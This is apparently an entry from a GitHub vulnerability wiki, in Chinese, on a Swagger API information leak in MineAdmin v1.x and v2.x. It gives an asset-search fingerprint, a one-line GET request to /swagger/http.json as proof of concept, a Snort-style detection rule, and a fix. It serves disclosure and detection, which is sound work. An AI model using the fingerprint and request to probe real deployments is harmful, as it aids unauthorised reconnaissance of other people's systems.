---
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# MineAdmin企业级后台管理系统swagger信息泄露漏洞

MineAdmin官网：https://doc.mineadmin.com/

资产测绘语法：body="MineAdmin"

# 影响版本

MineAdmin v1.x
MineAdmin v2.x

# **漏洞描述**

MineAdmin后台管理系统基于 Hyperf 框架开发。是一个后台权限管理系统，提供完善的权限体系，让开发者把注意力集中到具体业务当中，降低开发成本，提高项目效率。在系统默认配置部署的情况下存在swagger信息泄露

# 漏洞复现

POC/EXP：

```
GET /swagger/http.json   HTTP/1.1
Host: 127.0.0.1
```

![image-20260108155638706](./.resource/MineAdmin企业级后台管理系统swagger信息泄露漏洞/media/image-20260108155638706.png)


sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"MineAdmin - Swagger API Information Disclosure";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/swagger/http.json";
    metadata:
        service http,
        affected_product "MineAdmin",
        vulnerability_type "Information Disclosure",
        severity "medium";
    classtype:policy-violation;
    sid:1000575;
    rev:1;
    priority:2;
)
```

# 漏洞修复

swagger接口处加强权限校验。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
